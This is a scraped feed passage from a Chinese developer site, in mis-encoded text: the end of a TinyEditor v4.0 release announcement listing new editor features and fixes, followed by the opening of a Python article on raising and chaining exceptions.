<li>åŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fquill-modules%2Fquill-table-up" target="_blank" title="https://github.com/quill-modules/quill-table-up" ref="nofollow noopener noreferrer">quill-table-up</a> çš„æ–°è¡¨æ ¼æ–¹æ¡ˆï¼šè¡¨æ ¼æ“ä½œä½“éªŒ++âš¡ï¸</li>
<li>åŸºäº <code>emoji-mart</code> çš„ Emoji è¡¨æƒ…ï¼šè¡¨æƒ…å…šæœ€çˆ±ğŸ˜</li>
<li>æ”¯æŒæ–œæ†èœå•å’Œä¸°å¯Œçš„å¿«æ·é”®ï¼šé”®ç›˜æµçš„ç¦éŸ³ğŸ˜„</li>
<li>å›¾ç‰‡/è§†é¢‘/æ–‡ä»¶ä¸Šä¼ ä½“éªŒä¼˜åŒ–ğŸŒ„</li>
</ul>
<p>è¯¦ç»†çš„ Release Notes è¯·å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor%2Freleases%2Ftag%2Fv4.0.0" target="_blank" title="https://github.com/opentiny/tiny-editor/releases/tag/v4.0.0" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a></p>
<p>æ¬¢è¿å®‰è£… v4.0 ç‰ˆæœ¬ä½“éªŒï¼š</p>
<pre><code class="hljs language-shell" lang="shell">npm i @opentiny/fluent-editor@4.0.0
</code></pre>
<h2 data-id="heading-0">1 äº®ç‚¹ç‰¹æ€§</h2>
<h3 data-id="heading-1">1.1 å¤šäººåä½œç¼–è¾‘</h3>
<p>v4.0 æœ€é‡ç£…çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯å¼•å…¥äº†<strong>å®Œæ•´çš„åä½œç¼–è¾‘èƒ½åŠ›</strong>ã€‚æˆ‘ä»¬é›†æˆäº† quill-cursor æ¨¡å—ï¼Œæ”¯æŒå¤šäººå®æ—¶åä½œç¼–è¾‘ï¼Œå¹¶æä¾›äº†ç‹¬ç«‹çš„ npm åŒ…ä¾›å¼€å‘è€…é›†æˆã€‚æ— è®ºæ˜¯éœ€è¦ç¦»çº¿æ”¯æŒè¿˜æ˜¯äº‘ç«¯åä½œï¼ŒTinyEditor éƒ½èƒ½èƒœä»»ã€‚</p>
<p>ä½ å¯ä»¥åœ¨æˆ‘ä»¬çš„æ¼”ç¤ºé¡¹ç›®ä¸­è¿›è¡Œä½“éªŒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fprojects%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/projects/" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f5877094758471cae8f5098e8a82052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=cxikW09j%2BhFqcFJ5WIYxzOya0Bg%3D" alt="TinyEditor ååŒç¼–è¾‘æ•ˆæœ" loading="lazy"/></p>
<p>å…³äºååŒç¼–è¾‘æ›´è¯¦ç»†çš„ä»‹ç»ï¼Œå‚è€ƒï¼š<a href="https://juejin.cn/post/7565940210149064756" target="_blank" title="https://juejin.cn/post/7565940210149064756">å¦‚ä½•ä½¿ç”¨ TinyEditor å¿«é€Ÿéƒ¨ç½²ä¸€ä¸ªå¤šäººååŒå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Ÿ</a></p>
<h3 data-id="heading-2">1.2 è¡¨æ ¼èƒ½åŠ›å‡çº§</h3>
<p>é›†æˆäº†Â <strong>table-up</strong>Â æ¨¡å—ï¼Œå¤§å¹…æå‡äº†è¡¨æ ¼ç¼–è¾‘å’Œæ“ä½œèƒ½åŠ›ï¼Œæ”¯æŒæ›´å¤æ‚çš„è¡¨æ ¼åœºæ™¯ã€‚</p>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fdocs%2Fdemo%2Ftable-up" target="_blank" title="https://opentiny.github.io/tiny-editor/docs/demo/table-up" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0dbc39ec97f244b9b259517aacb4d683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=eSdfQ63Xv54PUxK3QR5YqdWONn4%3D" alt="TinyEditor è¡¨æ ¼æ¨¡å—æ•ˆæœ" loading="lazy"/></p>
<p>è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://juejin.cn/post/7527182608340484139#heading-0" target="_blank" title="https://juejin.cn/post/7527182608340484139#heading-0">æ›´å¼ºå¤§çš„è¡¨æ ¼</a></p>
<h3 data-id="heading-3">1.3 æ›´ä¸°å¯Œçš„ Emoji è¡¨æƒ…ğŸ˜˜</h3>
<ul>
<li>é›†æˆÂ <strong>emoji-mart</strong>ï¼Œæä¾›ä¸°å¯Œçš„è¡¨æƒ…é€‰æ‹©</li>
<li>ä¿®å¤äº†æ’å…¥è¡¨æƒ…åçš„å…‰æ ‡ä½ç½®é—®é¢˜</li>
<li>å®Œå–„äº†è¡¨æƒ…æ’å…¥çš„äº¤äº’ä½“éªŒ</li>
</ul>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fdocs%2Fdemo%2Femoji" target="_blank" title="https://opentiny.github.io/tiny-editor/docs/demo/emoji" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7b7f590ed114d46b5fb1185f6537854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=ntI6K0zJVyK6vear4RUpXOodM1Y%3D" alt="TinyEditor Emoji è¡¨æƒ…" loading="lazy"/></p>
<p>è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://juejin.cn/post/7527182608340484139#heading-1" target="_blank" title="https://juejin.cn/post/7527182608340484139#heading-1">æ›´ä¸°å¯Œçš„è¡¨æƒ…</a></p>
<h3 data-id="heading-4">1.4 å¿«æ·é”®å’Œå¿«é€Ÿèœå•</h3>
<p>æ–°å¢äº†å¼ºå¤§çš„å¿«æ·é”®ç³»ç»Ÿå’Œå¿«é€Ÿèœå•åŠŸèƒ½ï¼Œè®©é«˜çº§ç”¨æˆ·èƒ½å¤Ÿæ›´é«˜æ•ˆåœ°æ“ä½œç¼–è¾‘å™¨ã€‚</p>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fprojects%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/projects/" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/addf8f3ab20b4b74b371eb45300968e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=EL%2F7o4la6ffhzn2%2FlZ7nNV5uSsk%3D" alt="å¿«æ·é”®.gif" loading="lazy"/></p>
<h3 data-id="heading-5">1.5 é¢œè‰²é€‰æ‹©å™¨å‡çº§</h3>
<p>è‡ªå®šä¹‰é¢œè‰²é€‰æ‹©å™¨ç°åœ¨èƒ½ä¿å­˜å½“å‰é€‰æ‹©ï¼Œå¹¶æ”¯æŒæ·»åŠ æ›´å¤šé¢œè‰²ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a40da4b35d2543c6bff39fbf1a61c66a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=DMZbLG7yeY8wVbjPi%2Fkb8VpOGDE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">1.6 æ–‡æœ¬æ¨¡æ¿ä¸å›½é™…åŒ–</h3>
<ul>
<li>æ”¯æŒ i18n æ–‡æœ¬æ¨¡æ¿æ›¿æ¢</li>
<li>å®Œå–„äº†å›½é™…åŒ–ç¿»è¯‘ï¼ˆheaderã€picker ç­‰ç»„ä»¶ï¼‰</li>
<li>æ›´å¥½çš„å¤šè¯­è¨€æ”¯æŒä½“éªŒ</li>
</ul>
<h3 data-id="heading-7">1.7 å›¾ç‰‡å’Œæ–‡ä»¶å¢å¼º</h3>
<ul>
<li><strong>å›¾ç‰‡å·¥å…·æ </strong>ï¼šé€‰ä¸­å›¾ç‰‡æ—¶æ˜¾ç¤ºä¸“é—¨çš„æ“ä½œå·¥å…·æ </li>
<li><strong>è‡ªå®šä¹‰ä¸Šä¼ </strong>ï¼šå¢åŠ Â <code>allowInvalidUrl</code>Â é€‰é¡¹ï¼Œæ”¯æŒ Electron ç­‰ç‰¹å®šåœºæ™¯</li>
<li><strong>æ”¹è¿›çš„ä¸Šä¼ é€»è¾‘</strong>ï¼šä¼˜åŒ–äº†å¤±è´¥çŠ¶æ€çš„å¤„ç†</li>
</ul>
<h2 data-id="heading-8">2 æŠ€æœ¯æ”¹è¿›</h2>
<h3 data-id="heading-9">2.1 æ„å»ºå’Œå·¥ç¨‹åŒ–</h3>
<ul>
<li>ä¿®å¤äº† SSR æ„å»ºé—®é¢˜</li>
<li>ä¼˜åŒ–äº† Vite é…ç½®ï¼Œè§£å†³äº† PostCSS å’Œ Tailwind çš„å…¼å®¹æ€§é—®é¢˜</li>
<li>æ”¹è¿›äº† SCSS æ–‡ä»¶å¼•å…¥æ–¹å¼</li>
<li>è¾“å‡ºæ–‡ä»¶åç§°ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-10">2.2 ä¾èµ–ç®¡ç†</h3>
<ul>
<li>å¤–éƒ¨åŒ– emoji-mart å’Œ floating-ui ä¾èµ–ï¼Œå‡å°‘åŒ…ä½“ç§¯</li>
<li>ç§»é™¤äº† better-table å’Œ lodash-esï¼Œä¼˜åŒ–ä¾èµ–æ ‘</li>
</ul>
<h3 data-id="heading-11">2.3 ä»£ç è´¨é‡</h3>
<ul>
<li>å®Œæ•´çš„æµ‹è¯•è¦†ç›–ç‡æå‡</li>
<li>é‡æ„ä¼˜åŒ–ï¼šç§»é™¤å†—ä½™ä»£ç </li>
<li>API æ ‡å‡†åŒ–ï¼š<code>scrollIntoView</code>Â â†’Â <code>scrollSelectionIntoView</code></li>
<li>ç¤ºä¾‹ä»£ç  <code>async/await</code> æ”¹é€ ï¼Œä»£ç ç°ä»£åŒ–</li>
</ul>
<h3 data-id="heading-12">2.4 ç±»å‹å®‰å…¨</h3>
<ul>
<li>ä¿®å¤äº†å›  TypeScript ç±»å‹å¯¼è‡´çš„ç¼–è¯‘é”™è¯¯</li>
<li>æ”¹è¿›äº†ç±»å‹å®šä¹‰</li>
</ul>
<h3 data-id="heading-13">2.5 API å¯¼å‡ºå¢å¼º</h3>
<p>v4.0 å¯¼å‡ºäº†å·¥å…·æ é…ç½®å¸¸é‡ï¼Œæ–¹ä¾¿å¼€å‘è€…å®šåˆ¶ï¼š</p>
<ul>
<li><code>DEFAULT_TOOLBAR</code>ï¼šé»˜è®¤å·¥å…·æ é…ç½®</li>
<li><code>FULL_TOOLBAR</code>ï¼šå®Œæ•´å·¥å…·æ é…ç½®</li>
</ul>
<h3 data-id="heading-14">2.6 å¢åŠ è‡ªåŠ¨å‘åŒ…å·¥ä½œæµ</h3>
<ul>
<li>å¢åŠ  auto-publish / auto-deploy ç­‰è‡ªåŠ¨åŒ–å·¥ä½œæµï¼Œæ”¯æŒæ‰“ tag ä¹‹åè‡ªåŠ¨å‘ç‰ˆæœ¬ã€ç”Ÿæˆ Release Notes</li>
<li>PR é—¨ç¦åœ¨å•å…ƒæµ‹è¯•åŸºç¡€ä¸Šå¢åŠ  npm åŒ…å’Œç½‘ç«™æ„å»ºï¼Œç¡®ä¿åˆå…¥ PR ä¹‹å‰ï¼Œnpm åŒ…æ„å»ºå’Œç½‘ç«™æ„å»ºæ˜¯æ­£å¸¸çš„ï¼Œé€šè¿‡è‡ªåŠ¨åŒ–æ–¹å¼ä¿éšœç‰ˆæœ¬è´¨é‡ã€‚</li>
</ul>
<h2 data-id="heading-15">3 é—®é¢˜ä¿®å¤</h2>
<p>v4.0 ä¿®å¤äº†å¤§é‡å·²çŸ¥é—®é¢˜ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å·¥å…·æ é€‰æ‹©å™¨ä¸è·Ÿéšå…‰æ ‡å˜åŒ–çš„é—®é¢˜</li>
<li>è¡Œé«˜ä½œç”¨åŸŸé—®é¢˜</li>
<li>åˆ—è¡¨æ ·å¼æ˜¾ç¤ºä¸æ­£ç¡®</li>
<li>èƒŒæ™¯è‰² SVG å›¾æ ‡é—®é¢˜</li>
<li>VitePress é»˜è®¤æ ·å¼å½±å“çš„é—®é¢˜</li>
<li>è‡ªå®šä¹‰ä¸Šä¼ å¤±è´¥æ—¶è¡¨æ ¼æ•°æ®ç»“æ„ç ´åçš„é—®é¢˜</li>
<li>å¤šé¡¹æ–‡æ¡£å’Œå›½é™…åŒ–ç¿»è¯‘é—®é¢˜</li>
</ul>
<h2 data-id="heading-16">4 ç¤¾åŒºè´¡çŒ®</h2>
<p>æ„Ÿè°¢æ‰€æœ‰ä¸º v4.0 åšå‡ºè´¡çŒ®çš„å¼€å‘è€…ï¼ä½ ä»¬çš„è¾›å‹¤ä»˜å‡ºè®© TinyEditor å˜å¾—æ›´å¥½ï¼</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchenxi-20" target="_blank" title="https://github.com/chenxi-20" ref="nofollow noopener noreferrer">@chenxi-20</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGaoNeng-wWw" target="_blank" title="https://github.com/GaoNeng-wWw" ref="nofollow noopener noreferrer">@GaoNeng-wWw</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjany55555" target="_blank" title="https://github.com/jany55555" ref="nofollow noopener noreferrer">@jany55555</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqwangry" target="_blank" title="https://github.com/qwangry" ref="nofollow noopener noreferrer">@qwangry</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshenyaofeng" target="_blank" title="https://github.com/shenyaofeng" ref="nofollow noopener noreferrer">@shenyaofeng</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvaebe" target="_blank" title="https://github.com/vaebe" ref="nofollow noopener noreferrer">@vaebe</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwuyiping0628" target="_blank" title="https://github.com/wuyiping0628" ref="nofollow noopener noreferrer">@wuyiping0628</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYinlin124" target="_blank" title="https://github.com/Yinlin124" ref="nofollow noopener noreferrer">@Yinlin124</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzzxming" target="_blank" title="https://github.com/zzxming" ref="nofollow noopener noreferrer">@zzxming</a></li>
</ul>
<blockquote>
<p>æ³¨ï¼šæ’åä¸åˆ†å…ˆåï¼ŒæŒ‰åå­—é¦–å­—æ¯æ’åºã€‚</p>
</blockquote>
<p>å¦‚æœä½ æœ‰ä»»ä½•å»ºè®®æˆ–åé¦ˆï¼Œæ¬¢è¿é€šè¿‡Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor%2Fissues" target="_blank" title="https://github.com/opentiny/tiny-editor/issues" ref="nofollow noopener noreferrer">GitHub Issues</a>Â ä¸æˆ‘ä»¬è”ç³»ã€‚</p>
<h2 data-id="heading-17">å¾€æœŸæ¨èæ–‡ç« </h2>
<ul>
<li><a href="https://juejin.cn/post/7403618336952418314" target="_blank" title="https://juejin.cn/post/7403618336952418314">ğŸ‘TinyEditorï¼šä¸€ä¸ªåŸºäº Quill 2.0 çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼ŒåŠŸèƒ½å¼ºå¤§ã€å¼€ç®±å³ç”¨ï¼</a></li>
<li><a href="https://juejin.cn/post/7430505409176289320" target="_blank" title="https://juejin.cn/post/7430505409176289320">ğŸˆTinyEditor å¯Œæ–‡æœ¬å¼€æº2ä¸ªæœˆçš„æ€»ç»“ï¼šå¢åŠ æ ¼å¼åˆ·ã€æˆªå±ã€TypeScript ç±»å‹å£°æ˜ç­‰æ–°ç‰¹æ€§</a></li>
<li><a href="https://juejin.cn/post/7436030236784214068" target="_blank" title="https://juejin.cn/post/7436030236784214068">ğŸ¥³é‡ç£…æ›´æ–°ï¼TinyEditor å¼€æºå¯Œæ–‡æœ¬æ”¯æŒ LaTeX å¯ç¼–è¾‘å…¬å¼å•¦~</a></li>
<li><a href="https://juejin.cn/post/7406347285901426728" target="_blank" title="https://juejin.cn/post/7406347285901426728">ğŸ‰å–œæŠ¥ï¼TinyEditor å¼€æºå¯Œæ–‡æœ¬è¿æ¥äº†ç¬¬ä¸€ä½è´¡çŒ®è€…</a></li>
<li><a href="https://juejin.cn/post/7442330442606051338" target="_blank" title="https://juejin.cn/post/7442330442606051338">ğŸ‘è®©æˆ‘ä»¬ä¸€èµ·æ¥å»ºè®¾ TinyEditor å¼€æºå¯Œæ–‡æœ¬ç¼–è¾‘å™¨å§ï¼</a></li>
<li><a href="https://juejin.cn/post/7455243039655067657" target="_blank" title="https://juejin.cn/post/7455243039655067657">âœ¨TinyEditor v3.25.0 æ­£å¼å‘å¸ƒï¼2025å¹´ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¢åŠ æ ‡é¢˜åˆ—è¡¨å¯¼èˆªã€åˆ†éš”çº¿ç­‰å®ç”¨ç‰¹æ€§</a></li>
<li><a href="https://juejin.cn/post/7527182608340484139" target="_blank" title="https://juejin.cn/post/7527182608340484139">âš¡ï¸TinyEditor v4.0 alpha ç‰ˆæœ¬å‘å¸ƒï¼šæ›´å¼ºå¤§çš„è¡¨æ ¼ã€æ›´ä¸°å¯Œçš„è¡¨æƒ…ã€æ›´å¥½çš„ä¸Šä¼ ä½“éªŒ</a></li>
</ul>
<h2 data-id="heading-18">è”ç³»æˆ‘ä»¬</h2>
<p>GitHubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor" target="_blank" title="https://github.com/opentiny/tiny-editor" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a>ï¼ˆæ¬¢è¿ Star â­ï¼‰</p>
<p>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor" target="_blank" title="https://opentiny.github.io/tiny-editor" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editor</a></p>
<p>ä¸ªäººåšå®¢ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fkagol.github.io%2Fblogs%2F" target="_blank" title="https://kagol.github.io/blogs/" ref="nofollow noopener noreferrer">kagol.github.io/blogs/</a></p>
<p>å°åŠ©æ‰‹å¾®ä¿¡ï¼šopentiny-official</p>
<p>å…¬ä¼—å·ï¼šOpenTiny</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶]]></title>    <link>https://juejin.cn/post/7592548677744312366</link>    <guid>https://juejin.cn/post/7592548677744312366</guid>    <pubDate>2026-01-08T03:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677744312366" data-draft-id="7591969856578191410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-08T03:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·430351025068"/> <meta itemprop="url" content="https://juejin.cn/user/2578777865980459"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python çš„å¼‚å¸¸æŠ›å‡ºæœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578777865980459/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·430351025068
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:15:14.000Z" title="Thu Jan 08 2026 03:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€python è¯­æ³•</h2>
<h3 data-id="heading-1">1.1 å¼‚å¸¸æŠ›å‡º åŸºæœ¬è¯­æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è¾“å…¥æ ¼å¼æœ‰è¯¯"</span>)        <span class="hljs-comment"># æŠ›å‡ºå†…ç½®å¼‚å¸¸</span>
<span class="hljs-keyword">raise</span> ValueError()  <span class="hljs-comment"># ä½¿ç”¨é»˜è®¤æ¶ˆæ¯      # æŠ›å‡ºå¼‚å¸¸å®ä¾‹</span>
</code></pre>
<h3 data-id="heading-2">1.2 å¼‚å¸¸é“¾ï¼š è¯­æ³•** raise æ–°å¼‚å¸¸ from åŸå§‹å¼‚å¸¸ **</h3>
<ul>
<li>
<p>Python çš„ ä¼˜é›… å¼‚å¸¸é“¾ï¼ˆException Chainingï¼‰è¯­æ³•ï¼Œç”¨äºå°†ä¸€ä¸ªå¼‚å¸¸ä¸å¦ä¸€ä¸ªå¼‚å¸¸å…³è”èµ·æ¥ã€‚</p>
<ul>
<li>å½¢æˆå¼‚å¸¸çš„"å› æœå…³ç³»"</li>
<li>ä½¿ç”¨ from ä¿ç•™åŸå§‹å¼‚å¸¸</li>
<li>å¼‚å¸¸è½¬æ¢/å¼‚å¸¸åŒ…è£…ï¼ˆå¦‚ä¸šåŠ¡å¼‚å¸¸åŒ…è£…æŠ€æœ¯å¼‚å¸¸ï¼‰</li>
</ul>
</li>
<li>
<p>ç”¨ä¾‹å±•ç¤º</p>
